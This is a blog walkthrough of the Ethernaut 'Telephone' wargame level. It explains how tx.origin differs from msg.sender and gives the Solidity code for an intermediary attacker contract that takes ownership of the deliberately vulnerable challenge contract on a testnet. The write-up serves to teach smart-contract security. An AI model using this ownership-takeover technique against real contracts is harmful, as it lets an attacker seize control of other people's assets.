---
title: "Ethernaut L4: Telephone. Difference between tx.origen & msg.sender Globals Variables"
date: "05/02/2022"
img: "/blog/telephone.jpg"
---

<div class="separator" style="clear: both; text-align: center;"><br /></div>
<div class="separator" style="clear: both; text-align: center;">
  <a href="https://blogger.googleusercontent.com/img/a/AVvXsEj1CB5bXlc-iYOlMJncpQn6vYvH01ZYqpYKgbHyJUd4oLNutMnKE6aypzHbpNEtrAtcqrrAl-h0282fWofgSlqDuoOvLyblWHzDrUP4d-GPWLATvLkElVQj0rlq8gVIMMrpost4cy8_sZeWW8NOEokeR5f2EkQtSMSCVTrMhsra9VYMepH0NicCaD8V" style="margin-left: 1em; margin-right: 1em;"><img alt="" data-original-height="720" data-original-width="1280" height="360" src="https://blogger.googleusercontent.com/img/a/AVvXsEj1CB5bXlc-iYOlMJncpQn6vYvH01ZYqpYKgbHyJUd4oLNutMnKE6aypzHbpNEtrAtcqrrAl-h0282fWofgSlqDuoOvLyblWHzDrUP4d-GPWLATvLkElVQj0rlq8gVIMMrpost4cy8_sZeWW8NOEokeR5f2EkQtSMSCVTrMhsra9VYMepH0NicCaD8V=w640-h360" width="640" /></a>
</div>
<p></p>
<p>
  <i>To overcome this challenge, we have to become the owner of the contract.</i>
</p>
<p>The contract is very simple:</p>
<div style="background-color: #f2f2f2; padding: 10px; text-align: left;">
  <p style="padding: 10px;">
    <span style="font-family: courier;">// SPDX-License-Identifier: MIT<br />pragma solidity ^0.6.0;</span>
  </p>
  <p style="padding: 10px;">
    <span style="font-family: courier;">contract Telephone {</span>
  </p>
  <p style="padding: 10px;">
    <span style="font-family: courier;">&nbsp; address public owner;<br />&nbsp; constructor() public {<br />&nbsp;
      &nbsp; owner = msg.sender;<br />&nbsp; }</span>
  </p>
  <p style="padding: 10px;">
    <span style="font-family: courier;">&nbsp; function changeOwner(address _owner) public {<br />&nbsp; &nbsp;
      if (tx.origin != msg.sender) {<br />&nbsp; &nbsp; &nbsp; owner =
      _owner;<br />&nbsp; &nbsp; }<br />&nbsp; }<br />}</span>
  </p>
</div>
<br />

<div style="text-align: left;">
  <div>
    We see that we've a public variable of type address called owner, wich is
    definided at the time that the contract is deployed (at that moment, the
    constructor function is executed, defining the owner variable as the address
    that deployed the contract).
  </div>
  <div><br /></div>
  <div>
    After that, the contract has a public function called changeOwner, which
    receives as parameter an address, and performs the following check:
  </div>
</div>
<div style="text-align: left;"><br /></div>
<div style="text-align: left;">
  <span style="background-color: #f2f2f2; font-family: courier;">if (tx.origin != msg.sender)</span>
</div>
<div style="text-align: left;"><br /></div>
<div style="text-align: left;">
  <div>
    If this instruction returns true, the function assings the state variable
    owner as the address passed as parameter.&nbsp;
  </div>
  <div><br /></div>
</div>
<h3>What is the difference between tx.origin vs msg.sender?&nbsp;</h3>
<div style="text-align: left;">
  <div>
    Both are native Solidity global variables of type address, which means that
    these variables can be called from anywhere in the contract without the need
    to import anything.
  </div>
  <div><br /></div>
</div>
<div style="text-align: left;">
  <span style="background-color: #f2f2f2; font-family: courier;">tx.origin:</span>
</div>
<div style="text-align: left;"><br /></div>
<div style="text-align: left;">
  <span face="arial, sans-serif" style="background-color: white; color: #4d5156; font-size: 14px; white-space: nowrap;">◉</span>&nbsp;The original user wallet that initiated the transaction
</div>
<div style="text-align: left;">
  <span face="arial, sans-serif" style="background-color: white; color: #4d5156; font-size: 14px; white-space: nowrap;">◉</span>&nbsp;The origin address of potentially an entire chain of transactions and
  calls
</div>
<div style="text-align: left;">
  <span face="arial, sans-serif" style="background-color: white; color: #4d5156; font-size: 14px; white-space: nowrap;">◉</span>&nbsp;Only user wallet addresses can be the tx.origin
</div>
<div style="text-align: left;">
  <span face="arial, sans-serif" style="background-color: white; color: #4d5156; font-size: 14px; white-space: nowrap;">◉</span>A contract address never can be the tx.origin
</div>
<div style="text-align: left;">
  <div><br /></div>
  <div>
    <span style="background-color: #f2f2f2; font-family: courier;">msg.sender:</span>
  </div>
  <div><br /></div>
  <div>
    <span face="arial, sans-serif" style="background-color: white; color: #4d5156; font-size: 14px; white-space: nowrap;">◉</span>&nbsp;The immediate sender of this specific transaction or call
  </div>
  <div>
    <span face="arial, sans-serif" style="background-color: white; color: #4d5156; font-size: 14px; white-space: nowrap;">◉</span>&nbsp;Both user wallets and smart contracts can be the msg.sender
  </div>
  <div><br /></div>
  <div>
    In a simple call chain A-&gt;B-&gt;C-&gt;D, inside D&nbsp;<span class="notion-enable-hover" data-reactroot="" data-token-index="1" face="&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace" spellcheck="false" style="background: rgba(135, 131, 120, 0.15); border-radius: 3px; color: #eb5757; font-size: 85%; line-height: normal; padding: 0.2em 0.4em;">msg.sender</span>&nbsp;will be C, and&nbsp;<span class="notion-enable-hover" data-reactroot="" data-token-index="3" face="&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace" spellcheck="false" style="background: rgba(135, 131, 120, 0.15); border-radius: 3px; color: #eb5757; font-size: 85%; line-height: normal; padding: 0.2em 0.4em;">tx.origin</span>&nbsp;will be A.
  </div>
  <div>
    <div><br /></div>
  </div>
  <div>
    <b><i>Example</i></b>
  </div>
  <div>
    <b><i><br /></i></b>
  </div>
  <div>
    <div class="separator" style="clear: both; text-align: center;">
      <div class="separator" style="clear: both; font-style: italic; font-weight: bold; text-align: center;">
        <a href="https://blogger.googleusercontent.com/img/a/AVvXsEgtf3XMpKCMPhMJRgCSCtscGo_3SLuHf9ZxjRZaSTJPVGxxV1B3plo6n4TdO-dWA1YUK4_b8X5MudEvWyrRe6vcSdfCQq-sRZrK_Mpkgi9TTs69GW8QY3JN4TAH1Tj00CZl3s6h-I_f9v-sihSqXW3W-6JiXtjq4HZmGy9-R-dVjBiv6RxrmAUk8mF3" style="margin-left: 1em; margin-right: 1em;"><img alt="" data-original-height="383" data-original-width="628" height="390" src="https://blogger.googleusercontent.com/img/a/AVvXsEgtf3XMpKCMPhMJRgCSCtscGo_3SLuHf9ZxjRZaSTJPVGxxV1B3plo6n4TdO-dWA1YUK4_b8X5MudEvWyrRe6vcSdfCQq-sRZrK_Mpkgi9TTs69GW8QY3JN4TAH1Tj00CZl3s6h-I_f9v-sihSqXW3W-6JiXtjq4HZmGy9-R-dVjBiv6RxrmAUk8mF3=w640-h390" width="640" /></a>
      </div>
      <div class="separator" style="clear: both; text-align: center;">
        <i>msg.sender checks where the external function call directly came
          from.</i>
      </div>
      <br />
    </div>
    <div class="separator" style="clear: both; font-style: italic; font-weight: bold; text-align: left;">
      <br />
    </div>
    <div><b>Overcoming the challenge</b></div>
    <div>
      To hack the contract and claim ownership all we need to do is to create a
      new malicious contract (Contract B) that we'll use it for call the
      <span style="background-color: #f3f3f3;"><span style="font-family: courier;">changeOwner</span></span>
      function of the original contract Telephone.sol (Contract A in our
      example).
    </div>
    <div><br /></div>
    <div>
      To create smart contracts we've so many options of frameworks like
      Hardhat, Truffle, etc. but for this challenge I go to use Remix IDE. This
      tools offers us a complete development environment to create and deploy
      Smart Contracs directly from our browser.
    </div>
  </div>
  <div>
    <p data-pm-slice="1 1 []">
      1. Create a new contract (with the name you want, in my case I called it
      TelephoneAttack).&nbsp;
    </p>
    <div style="background-color: #f2f2f2; padding: 10px; text-align: left;">
      <p style="padding: 10px;">
        <span style="font-family: courier;">// SPDX-License-Identifier: MIT<br />pragma solidity ^0.8.0;<br /><br />contract
          TelephoneAttack{<br />&nbsp; &nbsp;&nbsp;<br />}</span>
      </p>
    </div>
    <p data-pm-slice="1 1 []" style="text-align: left;">
      2. We create an interface of the Telephone contract, this interface is the
      one we will use to interact with it. Inside the interface we must specify
      the functions as external.
    </p>
    <div style="background-color: #f2f2f2; padding: 10px; text-align: left;">
      <div style="padding: 10px; text-align: left;">
        <span style="font-family: courier;">interface ITelephoneContract{<br /></span><span style="font-family: courier;">&nbsp; &nbsp; function changeOwner(address _owner) external;<br /></span><span style="font-family: courier;">}</span>
      </div>
    </div>
    <p data-pm-slice="1 1 []">
      3. Inside the constructor of the Attacker contract we will create the
      instance of the victim contract (using the interface) with the address
      provided by Ethernaut.
    </p>
    <div style="background-color: #f2f2f2; padding: 10px; text-align: left;">
      <div style="padding: 10px; text-align: left;">
        <p style="padding: 10px; text-align: left;">
          <span style="font-family: courier;">ITelephoneContract public challenge;<br />&nbsp; &nbsp;&nbsp;<br />constructor(address
            _victimAddress){<br />&nbsp; &nbsp;challenge =
            ITelephoneContract(_victimAddress);<br />}</span>
        </p>
      </div>
    </div>
    <p data-pm-slice="1 1 []">
      4. We create a function called Attack that simply calls the changeOwner
      function of the contract instance belonging to the challenge.</p>
    <div style="background-color: #f2f2f2; padding: 10px; text-align: left;">
      <div style="padding: 10px; text-align: left;">
        <div style="padding: 10px; text-align: left;"><span style="font-family: courier;">function attack(address _newOwner) public {<br /></span><span style="font-family: courier;">&nbsp; challenge.changeOwner(_newOwner);<br /></span><span style="font-family: courier;">}</span></div></div></div><p data-pm-slice="1 1 []"><b><i>Deploying the attacking contract</i></b></p>
  </div>
  <div>Before deploying the contract, we verify that the "ENVIRONMENT" parameter of Remix is set to "Injected Web3".&nbsp;Then, when deploying it, we pass the constructor parameter, which is the address of the challenge instance (to find out we can type "await contract.address" in the console).</div><div><br /></div><div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEixTTnwa3KBdWBwfz3E1x-7DO58iNpDJRBhHIK3LQTwbcBfH-5RJiptkPbH9TjZfJyHeRMAhXUgbI7Jeb3JSZDfKTPeFoVzTApaoh_5ydN-1LGVVcL7zwLZVuLnhy00BoKIE5asibisEFZloFifuynalnfNTptX9QzmdzsmHI_8ccVP0vD2l6NsTP48" style="margin-left: 1em; margin-right: 1em;"><img alt="" data-original-height="478" data-original-width="360" height="240" src="https://blogger.googleusercontent.com/img/a/AVvXsEixTTnwa3KBdWBwfz3E1x-7DO58iNpDJRBhHIK3LQTwbcBfH-5RJiptkPbH9TjZfJyHeRMAhXUgbI7Jeb3JSZDfKTPeFoVzTApaoh_5ydN-1LGVVcL7zwLZVuLnhy00BoKIE5asibisEFZloFifuynalnfNTptX9QzmdzsmHI_8ccVP0vD2l6NsTP48" width="181" /></a></div><br />We confirm the transaction in our wallet and the contract is now deployed on the Rinkeby network.</div>
  <div><br /></div><div><b><i>Interacting with the attacking contract</i></b></div><div><b><i><br /></i></b></div><div>Remix creates a section with the contracts that we have deployed, in it we have in graphic form the functions or public variables of the deployed contracts with which we can interact.</div><div><b><i><br /></i></b></div><div><b><i><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEgM9A5MAJVQHC_XATYEdLjYjV-bSiO05q1Z10O5a7lLiv8Qn-st0160TcChNvvy2DycXK7IvsmTkzDPEnhrA-XdiEShudJhTIZxtRSAMvLb0I8YpG45CkuVWU_V-C20nP2GMygj6cpJopZ4LQ_bYTdX3t0vPG7Xe8Tb6ypSUj46VDpun1T7QV99peFx" style="margin-left: 1em; margin-right: 1em;"><img alt="" data-original-height="189" data-original-width="298" height="203" src="https://blogger.googleusercontent.com/img/a/AVvXsEgM9A5MAJVQHC_XATYEdLjYjV-bSiO05q1Z10O5a7lLiv8Qn-st0160TcChNvvy2DycXK7IvsmTkzDPEnhrA-XdiEShudJhTIZxtRSAMvLb0I8YpG45CkuVWU_V-C20nP2GMygj6cpJopZ4LQ_bYTdX3t0vPG7Xe8Tb6ypSUj46VDpun1T7QV99peFx" width="320" /></a></div><br /></i></b></div>
  <div>In this case, since the TelephoneAttack contract has only one public function called attack, we can interact with it by sending it our address as a parameter.&nbsp;</div><div><br /></div><div>And that's it! we can check if we are the owner of the contract by typing await <span style="background-color: #f3f3f3;">contract.owner()</span> and verifying that it is equal to our address.</div>
</div>


